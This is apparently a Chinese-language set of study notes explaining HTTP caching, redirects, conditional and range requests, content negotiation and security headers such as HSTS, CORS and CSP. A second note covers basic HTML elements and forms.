由服务开发人员明确部署，以降低源服务器负载并有效地交付内容，包括反向代理、CDN 和 service worker 与缓存 API 的组合 [!CAUTION] HTTP 缓存规范本质上没有定义显式删除缓存的方法——但是使用托管缓存，可以通过仪表板操作、API 调用、重新启动等实时删除已经存储的响应 启发式缓存 HTTP 旨在尽可能多地缓存，因此即使没有给出 Cache-Control，如果满足某些条件，响应也会被存储和重用 HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTLast-Modified（最后修改时间）: Tue, 22 Feb 2021 22:22:22 GMT!doctype html… 采取以上响应。此回复最后一次更新是在 1 年前 基于 age 的缓存策略 存储的 HTTP 响应有两种状态：fresh 和 stale。fresh 状态通常表示响应仍然有效，可以重复使用，而 stale 状态表示缓存的响应已经过期 确定响应何时是 fresh 的和何时是 stale 的标准是 age（在 HTTP/1.0 中，有效期是通过 Expires 标头来指定的，在 HTTP/1.1 中，Cache-Control 采用了 max-age——用于指定经过的时间） HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTCache-Control: max-age=604800!doctype html… 当响应存储在共享缓存中时，有必要通知客户端响应的 age。，如果共享缓存将响应存储了一天，则共享缓存将向后续客户端请求发送以下响应 HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTCache-Control: max-age=604800Age: 86400!doctype html… Vary响应 区分响应的方式本质上是基于它们的 URL 在 Vary 标头的值中添加“Accept-Language”，根据语言单独缓存响应 Vary: Accept-Language 这会导致缓存基于响应 URL 和 Accept-Language请求标头的组合进行键控 验证响应 验证是通过使用包含 If-Modified-Since 或 If-None-Match 请求标头的条件请求完成的 If-Modified-Since 下面的请求显示客户端发送带有 If-Modified-Since 请求标头的请求，以询问服务器自指定时间以来是否有任何的改变 GET /index.html HTTP/1.1Host: example.comAccept: text/htmlIf-Modified-Since: Tue, 22 Feb 2022 22:00:00 GMT 如果内容自指定时间以来没有更改，服务器将响应 304 Not Modified ETag/If-None-Match 如果 ETag 标头使用了 hash 值，index.html 资源的 hash 值是 deadbeef，响应如下 HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTETag: deadbeefCache-Control: max-age=3600!doctype html… 如果该响应是陈旧的，则客户端获取缓存响应的 ETag 响应标头的值，并将其放入 If-None-Match 请求标头中，以询问服务器资源是否已被修改 GET /index.html HTTP/1.1Host: example.comAccept: text/htmlIf-None-Match: deadbeef 如果服务器为请求的资源确定的 ETag 标头的值与请求中的 If-None-Match 值相同，则服务器将返回 304 Not Modified，如果服务器确定请求的资源现在应该具有不同的 ETag 值，则服务器将其改为 200 OK 和资源的最新版本进行响应 [!TIP] 可将ETag 和 Last-Modified 结合使用，ETag 提供高精度，而 Last-Modified 提供简单的时间戳，配合使用可以更高效地实现缓存控制 强制重新验证 如果你不希望重复使用响应，而是希望始终从服务器获取最新内容，则可以使用 no-cache 指令强制验证 no-cache：允许缓存，不允许直接使用缓存的数据，每次使用缓存前都要向服务器验证数据的有效性 通过在响应中添加 Cache-Control: no-cache 以及 Last-Modified 和 ETag。如果请求的资源已更新，客户端将收到 200 OK 响应，否则，如果请求的资源尚未更新，则会收到 304 Not Modified 响应 HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTLast-Modified: Tue, 22 Feb 2022 22:00:00 GMTETag: deadbeefCache-Control: no-cache!doctype html… 不使用缓存 no-cache 指令不会阻止响应的存储，而是阻止在没有重新验证的情况下重用响应 使用 private 指令将使个性化响仅与特定客户端一起存储，而不会泄露给缓存的任何其他用户，但在这种情况下，即使设置了 no-store，也必须设置 private 重新加载和强制重新加载 重新加载 GET / HTTP/1.1Host: example.comCache-Control: max-age=0If-None-Match: deadbeefIf-Modified-Since: Tue, 22 Feb 2022 20:20:20 GMT 请求中的 max-age=0 指令指定“重用 age 为 0 或更少的响应”——因此，中间存储的响应不会被重用 请求通过 If-None-Match 和 If-Modified-Since 进行验证 强制重新加载 GET / HTTP/1.1Host: example.comPragma: no-cacheCache-Control: no-cache 由于这不是带有 no-cache 的条件请求，因此你可以确定你会从源服务器获得 200 OK [!CAUTION] “no-cache”是正常重新加载的正确模式 fetch(“/”, { cache: “no-cache” }); “reload”是“强制重新加载”的正确模式 fetch(“/”, { cache: “reload” }); 避免重新验证 为了防止用户重新加载时，服务器在内容是不可变时，也会发送重新验证请求，immutable 指令可用于明确指示不需要重新验证 Cache-Control: max-age=31536000, immutable HTTP重定向 HTTP 重定向是服务器告诉客户端（通常是浏览器）将请求重定向到另一个 URL 的一种机制。这通常发生在资源已被移动、网站结构发生更改或服务器需要将请求路由到不同位置的情况下 HTTP 重定向通过返回特定的状态码和 Location 响应头来实现，浏览器收到这些信息后，会自动发起对新的 URL 的请求 永久重定向 表示原 URL 不应再被使用，而选用新的 URL 替换它 搜索引擎机器人、RSS 阅读器以及其他爬虫将更新资源原始的 URL 状态码 状态文本 处理方法 典型应用场景 301 Moved Permanently GET 方法不会发生变更。其他方法有可能会变更为 GET 方法。 网站重构。 308 Permanent Redirect 方法和消息主体都不发生变化。 使用用于非 GET 链接/操作重组网站。 临时重定向 有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下，可以使用临时重定向。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面 搜索引擎和其他爬虫不会记录新的、临时的 URL。 状态码 状态文本 处理方法 典型应用场景 302 Found GET 方法不会发生变更。其他方法有可能会变更为 GET 方法。[2] 由于不可预见的原因该页面暂不可用。 303 See Other GET 方法不会发生变更，其他方法会变更为 GET 方法（消息主体丢失）。 用于 PUT 或 POST 请求完成之后重定向，来防止由于页面刷新导致的操作的重复触发。 307 Temporary Redirect 方法和消息主体都不发生变化。 由于不可预见的原因该页面暂不可用。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。 特殊重定向 状态码 状态文本 典型应用场景 300 Multiple Choice 不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 Link 标头中加入机器可读的 rel=alternate 304 Not Modified 发送用于重新验证的条件请求。表示缓存的响应仍然是新的并且可以使用。 指向重定向的其他方式 HTML重定向机制 用于将用户的请求从一个页面自动转到另一个页面 可以尝试在页面的head中添加一个meta元素，并将其 http-equiv 属性的值设置为 refresh，可以告诉浏览器在指定的时间间隔后自动加载另一个页面。 该方法仅适用于 HTML 页面，然而并不能应用于图片或者其他类型的内容 head meta http-equiv=Refresh content=0(秒数); URL=http://example.com/(目标网址) //head 借助DOM的 JavaScript 重定向机制 通常使用 window.location 或 window.location.replace() 方法 window.location 通过改变浏览器的地址栏实现重定向，相当于用户点击了浏览器的地址栏并输入新的 URL window.location = https://www.example.com; window.location.replace() 会将当前页面从浏览器历史记录中移除，并跳转到新页面。它不会在浏览器的历史记录中留下当前页面，因此用户无法通过后退按钮回到当前页面。相当于无痕模式 window.location.replace(https://www.example.com); 应用场景 域名别称 扩大站点的用户覆盖面，迁移到新的域名，强制使用HTTPS 保持链接有效 当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你更新站点内部的链接来匹配新的 URL，也无法控制被外部资源使用的 URL。你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户并且帮助优化你的 SEO（搜索引擎优化，是一种通过优化网站和网页内容来提高其在搜索引擎结果页面（SERP）中的排名，从而增加网站的可见性和访问量的技术和策略），所以需要建立从旧链接到新链接的重定向映射 对于不安全请求、耗时请求的临时响应 配置重定向 通常，HTTP 重定向是由服务器配置文件（如 Apache 的 .htaccess 或 Nginx 的配置文件）实现的。 在 Apache 中使用 .htaccess 文件设置 301 重定向： Redirect 301 /oldpage http://example.com/newpage 在 Nginx 中设置 301 重定向： server location /oldpage return 301 http://example.com/newpage; HTTP条件请求 可以用来验证缓存的有效性，省去不必要的控制手段，以及验证文件的完整性，例如在断点续传的场景下或者在上传或者修改服务器端的文件的时候避免更新丢失问题 [!NOTE] 对于安全方法来说，例如 GET，通常用来获取文件，条件请求可以被用来限定仅在满足条件的情况下返回文件。这样可以节省带宽。 对于非安全方法来说，例如 PUT 方法，通常用来上传文件，条件请求可以被用来限定仅在满足文件的初始版本与服务器上的版本相同的条件下才会将其上传。 验证器 在请求中会传递一个描述资源版本的值，这些值称为“验证器”（1.文件的最后修改时间，即 last-modified（最后修改）时间；2.一个意义模糊的字符串，指代一个独一无二的版本，称为“实体标签”，或者 etag） Last-Modified 和 ETag 首部均可应用于两种验证类型 强验证类型 应用于需要逐个字节相对应的情况，例如需要进行断点续传的时候 通常这是由 ETag 首部来完成的，该首部可以提供使用 MD5 算法获取的资源（或其衍生品）的散列值 弱验证类型 应用于用户代理只需要确认资源内容相同即可。即便是有细微差别也可以接受，比如显示的广告不同，或者是页脚的时间不同 条件首部 If-Match 如果远端资源的实体标签与在 ETag 这个首部中列出的值相同的话，表示条件匹配成功。默认地，除非实体标签带有 ‘W/’ 前缀，否者它将会执行强验证。 If-None-Match 如果远端资源的实体标签与在 ETag 这个首部中列出的值都不相同的话，表示条件匹配成功。默认地，除非实体标签带有 ‘W/’ 前缀，否者它将会执行强验证。 If-Modified-Since 如果远端资源的 Last-Modified 首部标识的日期比在该首部中列出的值要更晚，表示条件匹配成功。 If-Unmodified-Since 如果远端资源的 HTTPHeader(“Last-Modified”)}} 首部标识的日期比在该首部中列出的值要更早或相同，表示条件匹配成功。 If-Range 与 If-Match 或 If-Unmodified-Since 相似，但是只能含有一个实体标签或者日期值。如果匹配失败，则条件请求宣告失败，此时将不会返回 206 Partial Content 响应码，而是返回 200 OK 响应码，以及完整的资源。 HTTP范围请求 HTTP 的 Range 请求使客户端能够要求服务器仅向其回传 HTTP 消息的一部分。 范围请求对于支持随机访问的媒体播放器、明确只需大型文件某部分的数据处理工具，以及允许用户暂停及恢复下载的下载管理器等客户端尤其有用 检测服务器端是否支持范围请求 如果 HTTP 响应中存在 Accept-Ranges 标头： 1.其值不是“none”，那么该服务器支持范围请求。你可以通过使用像 cURL 这样的工具发出一个 HEAD 请求来进行手动检查 curl -I http://i.imgur.com/z4d4kWk.jpg HTTP/1.1 200 OK…Accept-Ranges: bytesContent-Length: 146515 2.如果网站省略了 Accept-Ranges 标头，那么它们很可能不支持部分请求。有些网站会包含这个标头，但明确将其值设为“none”，以表明它们不支持这一特性 HTTP/1.1 200 OK…Accept-Ranges: none 在这种情况下，下载管理器可能会禁用暂停按钮 从服务器端请求特定的范围 在 HTTP 请求中包含 Range 标头，可以指定希望服务器返回文档的哪一部分或哪些部分 单一范围 curl的“-H”选项会向请求中添加一个标头，即 Range 标头 curl http://i.imgur.com/z4d4kWk.jpg -i -H Range: bytes=0-1023 用于请求1024字节 发出请求如下 GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 服务器将会返回 206 Partial Content 状态 HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024…（二进制内容） 多重范围 Range 标头还允许在文档中支持一次性获取多重范围。这些范围使用逗号分隔 curl http://www.example.com -i -H Range: bytes=0-50, 100-150 服务器以 206 Partial Content 状态码以及 Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5 标头响应，表明随后的数据将采用多部分字节范围格式。 每个部分都携带自己的 Content-Type 和 Content-Range 字段，而必须的 boundary 参数定义了用于分割每个消息体部分的边界字符串 条件式范围请求 If-Range HTTP 请求标头使范围请求具有条件性：如果条件兑现，则会发起范围请求，服务器将以包含适当内容主体的 206 Partial Content 响应进行回复。如果条件不兑现，会被发送完整的资源回来，并带有 200 OK 状态。该标头可与 Last-Modified 验证器或 ETag 一起使用，但不能同时使用 If-Range: Wed, 21 Oct 2015 07:28:00 GMT 范围请求的响应 206 Partial Content 范围请求成功 416 Requested Range Not Satisfiable超出范围的范围请求 200 OK不支持范围请求，并传输完整的响应体 HTTP内容协商 一种 HTTP 机制，它允许客户端和服务器在处理请求时根据客户端的需求和服务器支持的内容来协商返回的资源形式。这种机制通常用在需要提供不同格式、语言、编码或版本的资源时 服务端驱动型 服务器根据客户端在请求头中提供的信息来决定返回的资源版本 Accept标头 列举了用户代理希望接收的媒体资源的 MIME 类型（如 text/html, application/json） Accept-CH标头 列出了服务器可以用来选择合适响应的配置数据 值 含义 Device-Memory 标明客户端设备的内存大小。该值是个估计值，设备的实际内存值会向 2 的次方取整，且除以 1024。比如 512MB 的内存对应的值为 0.5。 Viewport-Width 标明用 CSS 像素数值表示的布局视口（layout viewport）宽度。 Width 标明用物理像素值表示的资源宽度（换句话说就是一张图片的固有大小）。 Accept-Encoding标头 说明了（接收端）可以接受的内容编码形式（所支持的压缩算法）（如 gzip, deflate） Accept-Language标头 提示用户期望获得的自然语言的优先顺序（如 en-US, zh-CN） User-Agent标头 提供客户端的设备信息 Vary响应标头 用于告诉客户端和代理服务器（如缓存服务器），哪些请求头会影响返回内容的变化 大多数情况下，vary用于在使用内容协商时创建缓存键 Vary: *Vary: header-name, header-name, ... *表示响应因无法确定的原因而改变，禁止缓存此响应 header-name指影响响应内容的请求头名称，例如 Accept、Accept-Language 如果服务器根据 Accept 请求头返回不同的资源（如 JSON 或 HTML），则应该在响应中添加： Vary: Accept 如果服务器根据 Accept-Language 返回不同的语言内容： Vary: Accept-Language 如果服务器根据 Accept-Encoding 提供不同的压缩格式（如 gzip 或 br）： Vary: Accept-Encoding 如果服务器根据 User-Agent 提供不同的内容（如桌面和移动设备优化）： Vary: User-Agent 代理驱动型（响应式协商) 客户端和服务器通过多次交互来确定最佳资源版本，面临不明确的请求时，服务器会返回一个页面，其中包含了可供选择的资源的链接 HTTP安全 用户信息安全 如何关闭表单自动填充 浏览器能够提供自动补全（在用户开始输入的时候给用户提供可能的内容）和自动填充（在加载的时候预先填充某些字段）功能，但可能涉及用户的隐私，因此浏览器允许用户禁用这些功能 禁止自动补全 将 autocomplete 的属性设置为 “off” 为整个表单设置： form method=post action=/form autocomplete=off[…]/form 为表单中某个输入元素单独设置： form method=post action=/form […] div label for=cc信用卡：/label input type=text id=cc name=cc autocomplete=off / /div/form 一些浏览器（如 Chrome 和 Edge）即使设置了 autocomplete=off，仍会尝试为用户名和密码字段提供自动填充功能，那么你需要更改输入元素的 name 属性（浏览器通常会根据字段的 name 属性判断其用途，可以为这些字段设置随机或无意义的 name 值） autocomplete 属性和登录字段 如果你定义了一个用户管理页面，其中用户可以为其他人指定新的密码，因此你想阻止密码字段的自动填充，你可以使用 autocomplete=new-password 内容安全 正确配置服务器 MIME 类型 text/html对于一般网页 text/plain对于一般文本 text/css对于级联样式表 text/javascript对于脚本 application/octet-stream意味着“下载这个文件” application/x-java-applet对于 Java 小程序 application/pdf对于 PDF 文档 严格传输安全 (HTTP Strict Transport Security, HSTS） 通过强制使用 HTTPS 而非 HTTP 来防止协议降级攻击和会话劫持 Strict-Transport-Security: max-age=expire-time[; includeSubDomains][; preload] max-age: 必须指定，表示 HSTS 策略的有效期（单位：秒）。例如，max-age=31536000 表示策略有效期为 1 年。 includeSubDomains: 可选，表示 HSTS 策略适用于主域及其所有子域。 如果设置了该参数，则 sub.example.com 也会强制使用 HTTPS。 preload: 可选，指示该域名申请加入浏览器的 HSTS 预加载列表。需要通过 HSTS Preload 提交，当使用 ， 指令必须至少是 （一年），并且必须存在指令 跨源资源共享（CORS） 一种基于 HTTP 标头的机制，用于允许服务器声明哪些来源（域名）可以访问其资源。它解决了浏览器的 同源策略 限制问题，从而安全地实现跨域资源的共享 简单请求 请求方法是 GET、POST 或 HEAD。 不包含自定义的请求标头（如 Authorization）。 Content-Type 标头所指定的媒体类型的值仅限于下列三者之一： application/x-www-form-urlencoded multipart/form-data text/plain 浏览器会直接发送请求，并根据响应头判断是否允许访问 GET /api/data HTTP/1.1 Host: api.example.com Origin: https://example.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://example.com 如果 Access-Control-Allow-Origin 标头的值与请求的 Origin 匹配，则浏览器允许访问响应数据 预检请求 对于非简单请求（如使用 PUT、DELETE 方法，或自定义标头），浏览器会在正式请求之前发送一个 预检请求（OPTIONS 请求），以确保服务器允许此操作 OPTIONS /api/data HTTP/1.1Host: api.example.comOrigin: https://example.comAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: Authorization HTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: AuthorizationAccess-Control-Max-Age: 3600 Access-Control-Allow-Origin: 指定允许的来源。 Access-Control-Allow-Methods: 列出允许的 HTTP 方法。 Access-Control-Allow-Headers: 列出允许的请求标头。 Access-Control-Max-Age: 指定预检结果的缓存时间（秒） 带凭据的请求 如果请求需要发送凭据（如 Cookies 或 HTTP 认证），需要满足以下条件： 客户端在请求中设置 withCredentials 为 true。 服务器返回的响应头包含 Access-Control-Allow-Credentials: true GET /api/data HTTP/1.1Host: api.example.comOrigin: https://example.comCookie: sessionId=abc123 HTTP/1.1 200 OKAccess-Control-Allow-Origin: https://example.comAccess-Control-Allow-Credentials: true 如果 Access-Control-Allow-Credentials 为 true，Access-Control-Allow-Origin 必须为具体的来源，不能使用通配符 * HTTP响应标头字段 1.Access-Control-Allow-Origin Access-Control-Allow-Origin: origin | * Access-Control-Allow-Origin 参数指定了单一的源，告诉浏览器允许该源访问资源。或者，对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符“*”，表示允许来自任意源的请求 2.Access-Control-Expose-Headers 跨源访问时，XMLHttpRequest 对象的 getResponseHeader() 方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头 将指定标头放入允许列表中，供浏览器的 JavaScript 代码（如 getResponseHeader()）获取 Access-Control-Expose-Headers: header-name[, header-name]* 3.Access-Control-Max-Age 指定了 preflight 请求的结果能够被缓存多久 Access-Control-Max-Age: delta-seconds 4.Access-Control-Allow-Credentials 指定了当浏览器的 credentials 设置为 true 时是否允许浏览器读取 response 的内容 Access-Control-Allow-Credentials: true 5.Access-Control-Allow-Methods 指定了访问资源时允许使用的请求方法，用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法 Access-Control-Allow-Methods: method[, method]* 6.Access-Control-Allow-Headers 用于预检请求的响应。其指明了实际请求中允许携带的标头字段 Access-Control-Allow-Headers: header-name[, header-name]* HTTP请求标头字段 1.Origin 表明预检请求或实际跨源请求的源站 Origin: origin origin 参数的值为源站 URL。它不包含任何路径信息，只是服务器名称 2.Access-Control-Request-Method 用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器 Access-Control-Request-Method: method 3.Access-Control-Request-Headers 用于预检请求，将实际请求所携带的标头字段（通过 setRequestHeader() 等设置的）告诉服务器。这个浏览器端标头将由互补的服务器端标头 Access-Control-Allow-Headers 回答 Access-Control-Request-Headers: field-name[, field-name]* 内容安全策略（CSP） 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等 为使 CSP 可用，你需要配置你的网络服务器返回 Content-Security-Policy HTTP 标头，除此之外，meta元素也可以被用来配置该策略 meta http-equiv=Content-Security-Policy content=default-src self; script-src self https://trusted.cdn.com CSP 示例配置 基本配置 只允许从同源加载资源，禁止内联脚本： Content-Security-Policy: default-src self; script-src self; 允许可信第三方资源 允许从指定的 CDN 加载 JavaScript 和样式： Content-Security-Policy: script-src self https://cdn.example.com; style-src self https://cdn.example.com; 启用报告机制 当策略被违反时，将报告发送到指定的 URL： Content-Security-Policy: default-src self; report-uri /csp-report-endpoint; 防止 iframe 嵌套 禁止页面被嵌套在 iframe 中，防止点击劫持攻击： Content-Security-Policy: frame-ancestors none; X 框架选项 ‘’’ HTTP标头","tags":["HTTP"],"categories":["计算机网络","网络协议"]},{"title":"HTML","path":"/2025/07/09/HTML/","content":"HTML 前备知识 !DOCTYPE html 声明为 HTML5 文档 html元素是 HTML 页面的根元素 head 元素包含了文档的元（meta）数据，如 meta charset=utf-8 定义网页编码格式为 utf-8。 title 元素描述了文档的标题 body 元素包含了可见的页面内容 h1 元素定义一个大标题 p 元素定义一个段落 HTML 是用来描述网页的一种超文本标记语言 标记语言是一套标记标签 (markup tag) HTML 使用标记标签来描述网页 标签内容/标签 HTML 文档包含了HTML 标签及文本内容 HTML文档也叫做 web 页面 !DOCTYPE 声明 !DOCTYPE声明（不区分大小写）有助于浏览器中正确显示网页。 中文编码 直接输出中文会出现中文乱码，要将头部将字符声明为 UTF-8 或 GBK。 HTML空元素 不含任何内容的元素，没有结束标签（最好加/），用于插入一些特殊的功能或信息，如**/br表换行** HTML 基础 HTML 标题 HTML 标题（Heading）是通过h1 - h6（从大到小） 标签来定义的。 注释: 浏览器会自动地在标题的前后添加空行。 HTML 水平线 标签在 HTML 页面中创建水平线。 **hr 元素可用于分隔内容**。 这是一个段落。 这是一个段落。 HTML 注释 可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。 HTML 段落 HTML 段落是通过标签 p 来定义的。 **注意：**浏览器会自动地在段落的前后添加空行。（/p 是块级元素） HTML 折行 如果您希望在不产生一个新段落的情况下进行换行（新行），请使用**br** 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。 注意：无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。 HTML 文本格式化 注：如果有2个 br 第一个为换行，第二个为空行 预格式：用于在显示时保留原始的排版和空格pre 将文字倒序 bdo标签用于显式控制文本的显示方向 dir 属性： ltr（left-to-right）：强制从左到右显示内容。 rtl（right-to-left）：强制从右到左显示内容。 bdo dir=rtl该段落文字从右到左显示。/bdo 地址 Written by Jon Doe.br HTML 链接 HTML 链接是通过标签 a 来定义的。 在 href 属性中指定链接的地址。 链接语法 href：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。 target（可选）：指定链接如何在浏览器中打开。常见的值包括 _blank（在新标签或窗口中打开链接）和 _self（在当前标签或窗口中打开链接）。 title（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。 rel（可选）：指定与链接目标的关系，如 nofollow、noopener 等。 **文本链接：**最常见的链接类型是文本链接，它使用 a 元素将一段文本转化为可点击的链接，例如： a href=https://www.example.com访问示例网站/a 没有下划线的链接： **图像链接：**您还可以使用图像作为链接。在这种情况下，a 元素包围着 img 元素。例如： a href=https://www.example.com img src=example.jpg alt=示例图片/a **锚点链接：**除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 a 元素定义一个标记，并使用#符号引用该标记。例如： a href=#section2跳转到第二部分/a!-- 在页面中的某个位置 --a name=section2/a **下载链接：**如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如： a href=document.pdf download下载文档/a 属性 target 使用 target 属性，你可以定义被链接的文档在何处显示。 在窗口上下文中，“top”指的是最顶层的窗口，而“self”是指当前的窗口或框架。使用target=_top会让链接在整个浏览器窗口中打开，而target=_self则在当前的窗口或框架中打开。 在本窗口(当前框架)打开 a href=https://www.runoob.com/ target=_self访问菜鸟教程!/a 在本窗口(窗口主框架)打开 a href=https://www.runoob.com/ target=_top访问菜鸟教程!/a 在新窗口打开 a href=https://www.runoob.com/ target=_blank访问菜鸟教程!/a 邮箱链接（mailto链接） a href=mailto:someone@example.com?subject=邮件主题body=邮件内容发送邮件/a mailto:someone@example.com 是收件人的邮箱地址。 subject=邮件主题 是邮件的主题。 body=邮件内容 是邮件的正文内容。 id id 属性可用于创建一个 HTML 文档书签。 提示: 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。 实例 在本页面中创建一个链接到有用的提示部分 在HTML文档中插入ID a href=#tips访问有用的提示部分/a a id=tips有用的提示部分/a 在另一个页面创建一个链接到有用的提示部分 a href=https://www.runoob.com/html/html-links.html#tips访问有用的提示部分/a HTML 图像 图像标签（ img）和源属性（Src） 在 HTML 中，图像由img 标签定义，img 是空标签，它只包含属性，没有闭合标签。 要在页面上显示图像，你需要使用源属性（src） “source”，其的值是图像的 URL 地址（URL 指存储图像的位置。如果名为 “pulpit.jpg” 的图像位于 www.runoob.com 的 images 目录中，那么其 URL 为 http://www.runoob.com/images/pulpit.jpg。） Alt属性 alt 属性用来为图像定义一串预备的可替换的文本。替换文本属性的值是用户定义的 图像的高度与宽度 height（高度） 与 width（宽度）属性用于设置图像的高度与宽度 创建图像映射 带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。 解释： 1.map 每个 area 元素可以有以下属性： shape：定义区域的形状，可以是 rect（矩形）、circle（圆形）、poly（多边形）或 default（默认区域）。 coords：定义区域的坐标，取决于区域的形状。 href：定义当用户点击这个区域时将导航到的 URL。 alt：提供区域的替代文本，有助于无障碍访问。 target：指定链接打开的目标窗口或框架。 2.coords 属性用于定义一个区域（通常是图像地图中的热点区域）的坐标。图像地图允许你将一个图像分割成多个可点击的区域，每个区域都链接到不同的 URL 或触发不同的动作。 coords 属性的值是一个由数字组成的字符串，数字之间用逗号分隔。这些数字代表热点区域的坐标。对于不同的 shape 值，coords 属性的格式会有所不同： rect：左上角的 x 和 y 坐标，右下角的 x 和 y 坐标。 circle：圆心的 x 和 y 坐标，然后是半径。 poly：多边形每个顶点的 x 和 y 坐标，顶点坐标依次排列。 HTML头部 在 head元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。可以添加在头部区域的元素标签为: title, style, meta, link, script, noscript 和 base **title**元素(title) 标签定义了不同文档的标题,在 HTML/XHTML 文档中是必需的, 定义了浏览器工具栏的标题 显示在收藏夹中的标题 显示在搜索引擎结果页面的标题 base元素(base) 描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接: link 元素(link) 标签定义了文档与外部资源之间的关系，通常用于链接到样式表 head link rel=stylesheet type=text/css href=mystyle.css /head style 元素(style) 定义了HTML文档的样式文件引用地址，在style 元素中也可以直接添加样式来渲染 HTML 文档: meta 元素(meta) META 元素（一般放在head）用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据（元数据也不显示在页面上，但会被浏览器解析）元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务 script 元素(script) 用于加载脚本文件，如： JavaScript HTML CSS CSS 可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用style 属性 内部样式表 -在HTML文档头部 head 区域使用style 元素 来包含CSS 外部引用 - 使用外部 CSS 文件 内联样式 background-color（背景色属性）定义一个元素的背景颜色 font-family（字体），color（颜色），和font-size（字体大小）属性定义字体的样式 text-align（文字对齐）属性指定文本的水平与垂直对齐方式 内部样式表 当单个文件需要特别样式时，就可以使用内部样式表 外部样式表 当样式需要被应用到很多页面的时候，使用外部样式表，可以通过更改一个文件来改变整个站点的外观。 HTML表格 由 table 标签来定义。是一种用于展示结构化数据的标记语言元素。 tr：tr 是 table row 的缩写，表示表格的一行。 td：td 是 table data 的缩写，表示表格的数据单元格（每行被分割为若干单元格） th：th 是 table header的缩写，表示表格的表头单元格。 如果不定义边框属性，表格将不显示边框table border=0 tfoot 可用于在表格的底部定义摘要、统计信息等内容。 caption 可用于为整个表格定义标题。 跨行或跨列的表格单元格 cellspacing=“10”==单元格间距=“10” cellpadding=“10”==单元格边距=“10” HTML 列表 HTML无序列表 无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。 无序列表使用 ul 标签定义，表示项目之间没有顺序关系。列表项用 li 标签表示 HTML 有序列表 列表项目使用数字进行标记。 有序列表始于 ol 标签。每个列表项始于 li 标签。 列表项使用数字来标记。 HTML 自定义列表 自定义列表不仅仅是一列项目，而是项目及其注释的组合。 自定义列表以 dl 标签开始。每个自定义列表项以 dt 开始。每个自定义列表项的定义以 dd 开始。 HTML 布局 使用div 元素 使用表格 HTML表单 HTML 表单用于收集用户的输入信息，如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。 form 元素用于创建表单 action 属性定义了表单数据提交的目标 URL method 属性定义了提交数据的 HTTP 方法（这里使用的是 “post”）。 label 元素用于为表单元素添加标签，提高可访问性。 input 元素是最常用的表单元素之一，它可以创建文本输入框、密码框、单选按钮、复选框等。 type 属性定义了输入框的类型， id 属性为 HTML 元素分配唯一标识符，用于关联 label 元素，id 则仅用于前端操作。一个页面中每个 id 必须唯一，通过 JavaScript 或 CSS 可以快速定位特定元素 class 属性为 HTML 元素分配一个或多个类名，用于分组和样式控制 name 属性用于标识表单字段，是表单提交的关键， value 用于为表单字段设置默认值/当前值当用户提交表单时，value 的值将作为该字段的值被发送到服务器 value 和 name 通常是同时使用的，name 指定字段的名称（键名），value 指定字段的值。 select 元素用于创建下拉列表，而 option 元素用于定义下拉列表中的选项。 required指定此输入框为必填字段。 输入类型 文本输入 (input type=text): 允许用户输入文本。 input type=text name=username placeholder=Enter your username placeholder提供输入提示，不会作为字段的实际值提交到服务器。 附：文本域（拉右下角可移动）：用户可在文本域中写入文本。可写入字符的字数不受限制。 密码输入 (input type=password): 用于输入密码，输入内容会显示为点或星号。 input type=password name=password placeholder=Enter your password 电子邮件输入 (input type=email): 用于输入电子邮件地址，会自动验证电子邮件格式。 input type=email name=email placeholder=Enter your email 数字输入 (input type=number): 用于输入数字，可以包括小数点和负数。 input type=number name=age placeholder=Your age 搜索框 (input type=search): 用于搜索，通常会显示为一个搜索框。 